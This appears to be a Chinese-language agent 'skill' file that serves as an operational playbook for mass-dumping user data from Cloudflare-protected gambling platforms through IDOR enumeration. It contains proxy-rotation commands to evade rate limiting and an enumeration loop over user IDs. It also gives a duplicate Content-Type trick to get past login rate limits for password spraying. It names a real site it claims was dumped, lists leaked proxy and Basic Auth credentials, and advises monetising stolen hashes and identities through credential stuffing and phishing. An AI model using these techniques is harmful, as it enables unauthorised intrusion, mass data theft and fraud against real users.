---
name: 隐鳞·雾墙
description: "CF铁墙下批量IDOR拖库: 403空body=风控, 免费SOCK5池轮换+慢速+新会话可绕."
version: 1.0.0
license: MIT
platforms: [linux, macos, windows]
metadata:
    tags: [cloudflare, cf, rate-limit, proxy, idor, dump, gambling, pentest]
    category: ctf-pentest
---
# CF 铁墙下批量拖库 / IDOR 枚举（代理池轮换）

Use when a Cloudflare-protected target (gambling platform, SPA+API) has an **IDOR / user-info
refresh endpoint** that returns per-user data (password hashes, balances, TG identity) and you
need to enumerate thousands of IDs — but high-frequency requests trip CF and everything 403s.
Proven on dbyl.ph 夺宝娱乐 (see `references/dbyl-365wallet-session.md`), 12.3 万用户拖库。

## CF 风控识别（关键）
- **`HTTP 403` + `content-length: 0` + 无 body** = CF 直接拒绝（IP 级风控/封禁），不是路径不存在。
- 先确认: 同一 curl 之前 200、突然 403 空 body → 你被限频了。403 带 `cf-ray` 正常（任何 CF 响应都有）。
- 触发阈值: 8 线程快速轮询 ~2-4 req/s/IP，几百到上千请求后触发；**免费代理池 + 1 req/1.2s/代理 可持续更久**。
- 风控按 IP 计（同账号多 IP 轮换也会全灭），**没有 cloudflare clearance 挑战页**（纯 API 目标）时等 15-60min 自然解封，或换 IP。

## 非 CF 的「网络层封禁」区分（2026-08 24vv 云发卡实测）
- 特征: 高频批量后**整出口 IP 对目标所有域名（含 CDN/静态）全部超时 000**，百度等无关站正常 → 是**网络层/源站 WAF 封禁**，不是 CF 应用层风控。
- **XFF / X-Real-IP / CF-Connecting-IP / True-Client-IP 伪造全部无效**（网络层过滤，应用层黑名单头不生效）→ 别浪费时间轮换伪造头。
- 解法只有真换出口: 免费 SOCKS5 池轮换 + 每请求前测活 + 慢速（每代理 2s/请求）避免二次 429；被封 IP 等 30-60min 自然解封。
- 应用层 429（`{"code":429,"msg":"Too many requests"}` 或 `{"detail":"Rate limit exceeded"}`）阈值通常很紧: 0.03s 间隔几次就触发；**2s/请求可连续 20+ 无 429**。

## 免费 SOCKS5 代理池（无需付费账号）
```bash
curl -s "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=5000&country=all&ssl=all&anonymity=all"
# 返回 ip:port 每行一个; 实测 20 个里 ~9 个可用、9 个里多数能过 CF
# 批量连通性测试: curl --proxy socks5://IP:PORT -m 10 https://target/ -o /dev/null -w "%{http_code}"
```
- 也有付费 socks5 池（如 `avchao1:CEA4spjzog@<ip>:50101` 多 IP 同账号）—— 更快但**全账号 IP 会被一起风控**，免费池反而靠数量存活。
- 免费池会话/存活不稳定，每次请求前先测，失败多等 3-5s；代理列表要周期性重新拉取。
- **分钟级失效工程细节（2026-08 24vv 实测）**: 免费池同一批 7-14 个代理**几分钟后多数变死** → 批量枚举脚本**每次启动必须重新拉取+并行测活**（ThreadPoolExecutor 并行验证，只留 200 的），**串行初始化（每代理 12s 超时 × N 个）会卡死成"可用会话 0"**。会话中途代理死亡要周期性重拉（proxyscrape 重新拉 + 并行验证）。若目标有 JS 挑战（如 sec_defend），初始化必须完整过挑战（GET / 拿 cookie 再回访，页面 len>5000 才算可用），只测 HTTP 200 但返回挑战页的代理不能直接发 API 请求。

## 拖库节奏（不触发 CF 的关键）
- 每代理 1 req / 1.0-2.0s；6-9 个代理并行 = 总 ~5-8 req/s 但分散到各 IP。
- **每个代理一个独立会话**：登录 → 拿 cookie + loginUid → 用该代理只发这个会话的请求。
- 出错（空响应/403）时 sleep 4-5s 再继续；累计 err > 40-80 就停，等解封或换池。
- 记录已拖 userId 集合（`seen`），断点续跑（每次启动读 dump 文件去重）——CF 迟早会封，断点续跑是常态不是例外。

## 注册无验证码作为备选入口（替代TG登录链）

很多平台（尤其是博彩）的注册接口 **不需要邮箱/手机/验证码校验**，仅需 username + password 即可注册：

```bash
POST /api/register  username=xxx&password=xxx&confirmPassword=xxx
→ {"code":0,"msg":"成功"}

POST /api/accountLogin  username=xxx&password=xxx
→ cookie + loginUid 会话
```

- 注册后直接获得**完整内部视角**，与 TG 登录用户权限相同
- 可用新账号的会话直接调用 IDOR 接口，**无需 TG 身份**
- 省去每个代理都要登录拿 sign 的步骤，批量扫描更快
- **适用场景**: TG 登录链接过期、sign 算法未知、不想用 TG 账号
- 注册后立即用 `refreshUserInfo` 查自己的 userId → 确认 ID 格式（通常 1,000,000+ 起）

## 新账号内部视角批量IDOR扫描

注册一个普通账号后，直接用其会话批量枚举 userId，无需代理池轮换登录：

```python
# 一个会话 + 一个可用代理 就能扫全库
cookies = "reg_cookies.txt"  # 注册登录后拿到
loginUid = "..."  # 从页面提取
for uid in range(start, end):
    curl -b cookies -d "loginUid=${loginUid}&userId=${uid}" \
        "https://target/api/refreshUserInfo"
```

- 新账号的 IDOR 权限与 TG 账号**完全一致**（无差别）
- 可以高并发扫描（CF 风控仍存在，但比 TG 登录链简单）
- 如果目标 CF 风控严，配合代理池 + 每代理一个注册账号并行扫
- 优先扫 **1,000,000 以下区间**（早期账号/代理/管理员 ID 集中于此）
- 发现高价值目标（充值>100万、余额>1000、testAccount=1）后立即记录

## 代理层级发现与高价值目标定位

从 IDOR 返回的 `referrerId` / `parentId` 字段可以构建代理关系网：

```python
from collections import Counter
refs = Counter(u['referrerId'] for u in users if u.get('referrerId'))
# 被最多人引用的 = 顶级代理
for rid, cnt in refs.most_common(10):
    print(f"{rid}: {cnt} 人")
```

- 顶级代理通常充值量最大（如 1000012 充值 1253 万 USDT）
- 重点扫描顶级代理的 `referrerId` 所在区间（如 1,000,000~1,001,000）
- 同时关注 `testAccount=1` 的测试账号（常有巨额余额，如 388,950 USDT）
- 余额高的用户（`balance` 字段）是直接提现目标
- 代理层级往往露出平台运营者身份（TG 昵称、用户名）

## 密码哈希类型区分

| 哈希类型 | 长度 | 来源 | 可破解性 |
|---|---|---|---|
| SHA-256 | 64 hex | TG 登录用户 | ❌ 强随机，不可破解 |
| MD5 | 32 hex | 早期/手机注册用户 | ❌ 带盐，rockyou 14M 全灭 |
| 提现密码 | 32 hex (MD5) | 绑卡时设置 | ❌ 非纯数字/简单密码 |

- 变现主路是**数据面**（密码哈希+用户画像+TG身份关联可撞库/社工/钓鱼大客户），不是密码恢复

## 执行优先级与方向切换

当一条路径受阻时，**不要死磕**，立刻切换到另一条可执行路径：

| 受阻方向 | 切换方向 |
|---|---|
| 365钱包 oauth 认证失败 | 注册新账号 IDOR 批量扫描 |
| captcha 验证码无法绕过 | 换目标/换攻击面 |
| CF 全代理 403 | 拉新代理池/等冷却/换注册账号扫 |
| 密码破解不成功 | 放弃密码，改打数据面/社工面 |

**避免卡死**: 如果有 3 个以上可用方向，并行推进最有可能出成果的 2 个，受阻立刻换。

## 每代理新会话流程（免验证码，靠长效登录链接）
很多平台给 TG/免注册用户发 `?uid=&time=&sign=` 登录链接，**sign 有效期很长（实测 40min+ 仍有效）**:
```bash
curl -sk --proxy socks5://IP:PORT -c cookies.txt "https://target/?type=2&uid=...&time=...&sign=...&h5session=..." -o login.html
loginUid=$(grep -oE "loginUid = '[0-9a-f]{32}'" login.html | grep -oE "[0-9a-f]{32}" | head -1)
```
- **loginUid 每次登录都变**，必须从登录 HTML 重新提取；cookie 和 loginUid 要配套使用。
- 之后所有 API 请求带 `Cookie: <cookies>` + 表单体里的 `loginUid`。

## IDOR 接口形态（refreshUserInfo 模式）
典型: `POST /api/refreshUserInfo`，参数 `loginUid`(会话) + `userId`(攻击者可控)：
- **userId 与会话不绑定 = 拖库点**。返回密码哈希（SHA-256 64hex / MD5 32hex）、提现密码哈希、余额、充值/提现流水、TG UID/用户名、注册 IP、上级代理 ID。
- **Content-Type 陷阱**: 前端 jQuery `$.post` 用 `application/x-www-form-urlencoded`，而 `fetch`+JSON body 会返回 `{"code":2000,"msg":"登录过期"}` 假阴性。**先抓前端真实请求的 Content-Type，别默认 JSON。**
- userId 从 1000000 起连续（平台注册量），代理 ID 可能更早 → 拖库范围要覆盖 1,000,000 以下找代理/早期账号。
- 枚举脚本要点: 多线程各跑一段 `range(start, end, -step)`（倒序），每线程独立代理会话；`err>N` 即停。

## 登录签名（sign）与 token
- sign 是服务端生成（md5 变体 + secret），前端拿不到算法 → 别浪费时间破（除非有 JS 泄漏）。
- token 是加密二进制（AES 类，hex 可解出乱码），不可直接解码为凭据。
- `webTgLogin/tgLogin` 伪造 initData 有服务端校验（hash 伪造 → 数据校验失败），不要当捷径。

## 写操作面（通常会话绑定，别重复试）
- 改密码 `modifyPwd`、提现 `cash`、绑卡 `listCashAccount` 等写接口按**会话校验**（userId 参数被忽略）→ IDOR 只读数据可拖，写操作走不了。
- 充值下单 `requestRechargeUrl` 可无限下单（订单号 `merchantId-userId-timestamp-rand` 可预测），订单状态经 refreshUserInfo 的 `orderInfoList[].payStatus` 返回（0=未支付）。
- 金额边界校验: 负数/0 → `Exceeding the limit`；`0.01`/`1e18` → Spring 类型转换错误（泄露 Java 后端）。

## 破解密码哈希（拖到哈希后的下一步）
- 全库 32-hex 目标（MD5 密码/提现密码）用 rockyou 完整版（14M 条）+ 账号名组合 + 双层 md5 都破不了 = **强随机/带盐，直接放弃换面**。
- SHA-256 64-hex 是 TG 免注册用户的随机密码，无规律（sha256(tgid) 等都不中）→ 不可破解。
- 变现主路是**数据面**（密码哈希+用户画像+TG身份关联可撞库/社工/钓鱼大客户），不是密码恢复。

## 重复 Content-Type 头绕过 CF 应用层限速（2026 实战技巧）

当 CF 限速是**应用层 429**（JSON 响应 `{"detail":"Rate limit exceeded"}`）而非 WAF 层 403 时，可以通过**重复 Content-Type 头**绕过：

```bash
# 常规请求 → 429
curl -X POST https://target.com/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"user@test.com","password":"test123"}'

# 重复 Content-Type 头 → 绕过（CF 读第二个，后端读第一个）
curl -X POST https://target.com/api/auth/login \
  -H "Content-Type: application/json" \
  -H "Content-Type: text/plain" \
  -d '{"email":"user@test.com","password":"test123"}'
```

**原理**: CF 应用层 rate limit 规则匹配 `Content-Type: application/json`。发送两个 Content-Type 头时，CF 取最后一个（`text/plain` → 不匹配规则），后端（FastAPI/Flask）取第一个（`application/json` → 正常解析 JSON body）。

**适用条件**:
- CF 返回 HTTP 429，body 为 JSON 格式的 `{"detail":"Rate limit exceeded"}`
- 后端是 FastAPI 或类似框架（读第一个 Content-Type 头）
- 端点需要 `application/json` 请求体

**已验证场景**:
| 端点 | 效果 |
|------|------|
| `POST /api/auth/register` | ✅ 绕过注册限速 |
| `POST /api/auth/login` | ✅ 绕过登录限速（可做密码喷洒） |
| `POST /api/webhook/nowpayments` | ✅ 绕过 |
| `POST /api/newsletter` | ✅ 绕过 |

**限制**: 每个 IP 窗口内仍有次数限制（约 5-10 次后触发另一层限速），需配合延时或代理轮换。

**替代方案**: 如果重复 Content-Type 被拦截（HTTP 1000 / 403），尝试 `application/json; charset=utf-8` 或 `Application/JSON` 等变体（但通常也被匹配）。真正的绕过是让 CF 和应用看到不同的 Content-Type 值。

## 附: 支付网关关联资产
- 充值通道常跳第三方钱包: TG bot（OKAY Pay 类）或 web 钱包（365钱包/1BET 系, `score.cxocvnmd.cc`/`lay.cfv7l.com`/`c5c.bci330.com` 多域同前端）。
- 365钱包加密协议（AES+RSA 混合 + JS 硬编码私钥）完整逆向见 `references/dbyl-365wallet-session.md` §加密钱包。
- 同 IP 上挂的 SEO 站群（.com.cn 假站）通常与目标无关，别浪费时间。

## 365钱包注册流程（对抗验证码）

全流程链路: 获取 captcha → OCR → 发送邮箱验证码 → 收码 → 注册 → OAuth 登录

### 注册端点
| 端点 | 说明 |
|---|---|
| `GET /auth/captcha2Base64?key={uuid}` | 获取验证码图片（GIF, 4帧动画） |
| `GET /auth/register/send/{emailCode|smsCode}/{account}` | 发送验证码到邮箱/手机 |
| `GET /auth/register/check/{account}/{type}` | 检查账号状态 |
| `POST /auth/register/{email|phone}` | 注册（数据在 encrypted envelope 的 `data` 字段） |
| `POST /auth/register/bind/create` | 创建 BindToken |
| `GET /auth/register/bind/merchant` | 获取商户信息 |
| `POST /auth/oauth/token` | OAuth 登录（需 Basic Auth + 加密 envelope） |

### 请求格式陷阱
- 注册参数必须放在 encrypted envelope 的 **`data`** 字段，不是 `params` 或 `path` 的 query string
- 字段名: `account`/`password`/`code`(邮箱验证码)/`key`(captcha key)/`verificationCode`/`amount`(资金字段)
- 验证码字段名经过测试: `code` 和 `verificationCode` 都接受，其他变体（`verifyCode`/`smsCode`/`emailCode`/`captchaCode`）被拒
- 有 `amount`/资金字段校验，注册时需传 `amount=100` 或类似值

### GIF 动画验证码对抗
- 验证码是 **4 帧 GIF 动画**，每帧内容不同（抗 OCR 设计）
- ddddocr 识别结果不稳定（每帧不同: buv/pyu/Fkv/fcv）
- tesseract 也对抗不住（不同帧: LVSwy/Sea/P=/Fo*y）
- 预处理（放大/二值化/自适应阈值/中位数合并）均无效
- 需要专业打码平台或人工识别
- **替代方案**: 如果验证码过不去，直接换攻击面（如注册新账号 IDOR 扫描），不要死磕

### 加密 API 客户端注意事项
- 用 `data` 字段传参（不是 `params`），contentType 用 `application/json`
- 365 钱包的 oauth/token 返回 `{"code":500,"message":"认证失败"}` = Basic Auth `365:96F4D6gfq1zYrw4` 可能过期或请求格式不对
- 所有 401 的 internal API 都需要有效 user token

## 参考
- `references/dbyl-365wallet-session.md` — dbyl.ph 完整会话: 拖库节奏、IDOR 复现、订单格式、365钱包 AES+RSA 协议与 Python 客户端、数据统计。
- `references/dbyl-365wallet-register-flow.md` — 365钱包注册流程细节、验证码对抗、字段名枚举。
- `references/deepalpha-cloudflare-429-bypass.md` — DeepAlpha 案例: 重复 Content-Type 头绕过 CF 应用层 429、FastAPI 指纹、用户枚举细节。
